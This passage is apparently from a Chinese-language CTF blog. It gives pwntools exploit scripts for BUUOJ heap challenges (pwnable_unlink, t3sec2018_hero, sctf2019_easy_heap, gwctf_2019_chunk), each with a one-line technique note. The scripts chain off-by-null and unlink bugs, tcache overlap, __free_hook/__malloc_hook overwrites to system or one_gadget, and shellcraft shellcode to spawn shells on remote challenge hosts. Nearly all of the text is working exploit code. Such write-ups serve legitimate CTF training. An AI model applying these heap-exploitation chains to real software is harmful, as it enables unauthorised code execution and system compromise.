class="line">    sla(b&quot;Size: &quot;,str(size))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(b&quot;&gt;&gt; &quot;,b&quot;2&quot;)</span><br><span class="line">    sla(b&quot;Index: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># def show(idx):</span><br><span class="line">#     sla(b&quot;6. Bye :)\n&quot;,b&quot;4&quot;)</span><br><span class="line">#     sla(b&quot;ID:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">#off by null</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sla(b&quot;&gt;&gt; &quot;,b&quot;3&quot;)</span><br><span class="line">    sla(b&quot;Index: &quot;,str(idx))</span><br><span class="line">    sa(b&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line"># def rol(val,k):</span><br><span class="line">#     s=bin(val)[2:]</span><br><span class="line">#     return int(s[k:]+s[:k],2)</span><br><span class="line"># def ror(val,k):</span><br><span class="line">#     s=bin(val)[2:]</span><br><span class="line">#     return int(s[-k:]+s[:len(s)-k],2)</span><br><span class="line"># def convert_str_asmencode(content: str):</span><br><span class="line">#     out = &quot;&quot;</span><br><span class="line">#     for i in content:</span><br><span class="line">#         out = hex(ord(i))[2:] + out</span><br><span class="line">#     out = &quot;0x&quot; + out</span><br><span class="line">#     return out</span><br><span class="line"></span><br><span class="line">#debug_force()</span><br><span class="line">ru(b&quot;Mmap: &quot;)</span><br><span class="line">shellcode_addr=int(rld(),16)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0X418)</span><br><span class="line">ru(b&quot;chunk at [0] Pointer Address &quot;)</span><br><span class="line">bss_addr=int(rld(),16)-8</span><br><span class="line">add(0x18)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x4f8)</span><br><span class="line">add(0x18)</span><br><span class="line">free(0)</span><br><span class="line">edit(2,b&quot;a&quot;*0x20+p64(0x470))</span><br><span class="line">free(3)</span><br><span class="line">free(1)</span><br><span class="line">add(0x418)</span><br><span class="line">add(0x18)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x18)</span><br><span class="line">free(3)</span><br><span class="line">edit(1,p64(bss_addr+0x40)+b&#x27;\n&#x27;)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x28)</span><br><span class="line">edit(6,p64(len(shellcode)+0x10)+p64(shellcode_addr)+p64(0x20)+b&quot;\x30\n&quot;)</span><br><span class="line">edit(5,p64(shellcode_addr)+b&quot;\n&quot;)</span><br><span class="line">edit(4,shellcode+b&quot;\n&quot;)</span><br><span class="line">add(0x10)</span><br><span class="line">#debug()</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="pwnable-unlink"><a href="#pwnable-unlink" class="headerlink" title="pwnable_unlink"></a>pwnable_unlink</h3><p>利用unlink栈迁移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># from LibcSearcher import LibcSearcheronline</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = &quot;./unlink&quot;</span><br><span class="line"></span><br><span class="line">parm=elf_path</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    if sys.argv[1]==&quot;ssh&quot;:</span><br><span class="line">        shell = ssh(host=&quot;node4.buuoj.cn&quot;, user=&quot;unlink&quot;, port=26277, password=&quot;guest&quot;)</span><br><span class="line">        io=shell.process(elf_path)</span><br><span class="line">    else:</span><br><span class="line">        remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">        remote_port = 29038</span><br><span class="line">        io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    io = process(parm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(b&quot;here is stack address leak: &quot;)</span><br><span class="line">stack_addr=int(rld(),16)</span><br><span class="line">ru(b&quot;here is heap address leak: &quot;)</span><br><span class="line">heap_addr=int(rld(),16)</span><br><span class="line">shell=0x8048566</span><br><span class="line">sla(b&quot;get shell!\n&quot;,p32(shell).ljust(16,b&quot;a&quot;)+p32(stack_addr+0x8)+p32(heap_addr+0xc))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="t3sec2018-hero"><a href="#t3sec2018-hero" class="headerlink" title="t3sec2018_hero"></a>t3sec2018_hero</h3><p>利用off by null进行unlink</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;./hero&quot;</span><br><span class="line">parm=elf_path</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port = 26668</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    io = process(parm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    global io</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *$rebase(0xF4C)</span><br><span class="line">    c</span><br><span class="line">    x/10xg $rebase(0x2020C0)</span><br><span class="line">    x/10xg $rebase(0x202060)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug_force():</span><br><span class="line">    global io</span><br><span class="line">    io.close()</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *0x40074F</span><br><span class="line">    c</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    io=gdb.debug(parm, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#112</span><br><span class="line">def add(name,power):</span><br><span class="line">    sla(b&quot;Your choice: &quot;,b&quot;1&quot;)</span><br><span class="line">    sa(b&quot;What&#x27;s your hero&#x27;s name:\n&quot;,name)#off by null</span><br><span class="line">    sa(b&quot;What&#x27;s your hero&#x27;s power:\n&quot;,power)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#没有清空</span><br><span class="line">def free(idx):</span><br><span class="line">    sla(b&quot;Your choice: &quot;,b&quot;4&quot;)</span><br><span class="line">    sla(b&quot;What hero do you want to remove?\n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(b&quot;Your choice: &quot;,b&quot;2&quot;)</span><br><span class="line">    sla(b&quot;What hero do you want to show?\n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,name,power):</span><br><span class="line">    sla(b&quot;Your choice: &quot;,b&quot;3&quot;)</span><br><span class="line">    sla(b&quot;What hero do you want to edit?\n&quot;,str(idx))</span><br><span class="line">    sa(b&quot;What&#x27;s your hero&#x27;s name:\n&quot;,name)#off by null</span><br><span class="line">    sa(b&quot;What&#x27;s your hero&#x27;s power:\n&quot;,power)</span><br><span class="line"># def convert_str_asmencode(content: str):</span><br><span class="line">#     out = &quot;&quot;</span><br><span class="line">#     for i in content:</span><br><span class="line">#         out = hex(ord(i))[2:] + out</span><br><span class="line">#     out = &quot;0x&quot; + out</span><br><span class="line">#     return out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#debug_force()</span><br><span class="line">add(b&quot;a&quot;,b&quot;b&quot;)</span><br><span class="line">add(b&quot;a&quot;,b&quot;b&quot;)</span><br><span class="line">add(b&quot;a&quot;*0x60+p64(0x2e0),b&quot;b&quot;)</span><br><span class="line">for i in range(3,10):</span><br><span class="line">    add(b&quot;a&quot;,b&quot;b&quot;)</span><br><span class="line">for i in range(9,2,-1):</span><br><span class="line">    free(i)</span><br><span class="line">free(0)</span><br><span class="line">free(2)#重叠堆块</span><br><span class="line">for i in range(7):#用完7个tcache</span><br><span class="line">    add(b&quot;a&quot;,b&quot;b&quot;)</span><br><span class="line">add(b&quot;b&quot;,b&quot;a&quot;)</span><br><span class="line">show(8)</span><br><span class="line">ru(b&quot;Power:&quot;)</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))+0x7fd2ff359000-0x7fd2ff745061</span><br><span class="line">add(b&quot;a&quot;,b&quot;b&quot;)</span><br><span class="line">free(0)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">free(9)</span><br><span class="line">add(b&quot;a&quot;,p64(libc_base+libc.sym[&quot;__free_hook&quot;]))</span><br><span class="line">add(b&quot;/bin/sh\0&quot;,b&quot;a&quot;)#1</span><br><span class="line">add(b&quot;a&quot;,b&quot;a&quot;)</span><br><span class="line">add(b&quot;a&quot;,p64(libc_base+libc.sym[&quot;system&quot;]))</span><br><span class="line">free(1)</span><br><span class="line">#debug()</span><br><span class="line">it()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="sctf2019-easy-heap"><a href="#sctf2019-easy-heap" class="headerlink" title="sctf2019_easy_heap"></a>sctf2019_easy_heap</h3><p>利用bss unlink达到任意地址写，主要可以写shellcode和修改free的ptr<br>然后就是利用普通的unlink达到堆块重叠的效果<br>这里需要爆破free_hook<br><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#sctf2019_easy_heap">https://buuoj.cn/challenges#sctf2019_easy_heap</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./easy_heap&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">25857</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    global io</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0x11FF)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/20xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">  </span><br><span class="line">def debug_force():</span><br><span class="line">    global io</span><br><span class="line">    io.<span class="built_in">close</span>()</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0xe5c)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1134)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/0xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x202100)</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x2021A0)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    io=gdb.debug(elf_path,gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="number">0x1000</span></span><br><span class="line">def add(size):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    </span><br><span class="line">#清零了</span><br><span class="line">def free(index):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"># def show(index):</span><br><span class="line">#     sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">#     sla(b<span class="string">&quot;index&gt; &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    sa(b<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># def convert_str_asmencode(content: str):</span><br><span class="line">#     out = <span class="string">&quot;&quot;</span></span><br><span class="line">#     <span class="keyword">for</span> i in content:</span><br><span class="line">#         out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">#     out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">#     <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">#off by null</span><br><span class="line"></span><br><span class="line">ru(b<span class="string">&quot;Mmap: &quot;</span>)</span><br><span class="line">shellcode_addr=<span class="type">int</span>(rld(),<span class="number">16</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">ru(b<span class="string">&quot;chunk at [0] Pointer Address &quot;</span>)</span><br><span class="line">ptr_addr=<span class="type">int</span>(rld(),<span class="number">16</span>)</span><br><span class="line">load_addr=ptr_addr<span class="number">-0x202068</span></span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr_addr<span class="number">-0x18</span>)+p64(ptr_addr<span class="number">-0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x500</span>)+p64(ptr_addr+<span class="number">0x8</span>)+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x500</span>)+p64(shellcode_addr)+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>,asm(shellcraft.sh())+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x520</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x18</span>)+b<span class="string">&quot;\xd0&quot;</span>+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">edit(<span class="number">2</span>,b<span class="string">&quot;\x90\n&quot;</span>)</span><br><span class="line">edit(<span class="number">5</span>,b<span class="string">&quot;\xe8\xa8\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(shellcode_addr)+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sl(b<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">it()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="gwctf-2019-chunk"><a href="#gwctf-2019-chunk" class="headerlink" title="gwctf_2019_chunk"></a>gwctf_2019_chunk</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gwctf_2019_chunk">https://buuoj.cn/challenges#gwctf_2019_chunk</a><br>利用malloc_hook改成realloc,然后realloc_hook改成one_gadget<br>malloc_hook修改relloc的push指令达到符合one_gadget的效果<br>off by null的unlink</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="number">0</span>~<span class="number">255</span></span><br><span class="line">def add(idx,size):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;me a book ID: &quot;</span>,str(idx))</span><br><span class="line">    sla(b<span class="string">&quot;how long: &quot;</span>,str(size))</span><br><span class="line">    </span><br><span class="line">#清零了</span><br><span class="line">def free(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;one to throw?\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;want to show&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">#off by null</span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;book to write?&quot;</span>,str(index))</span><br><span class="line">    sa(b<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(b<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))+<span class="number">0x7f07d7715000</span><span class="number">-0x7f07d7ad9b78</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]<span class="number">-0x23</span>)+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span 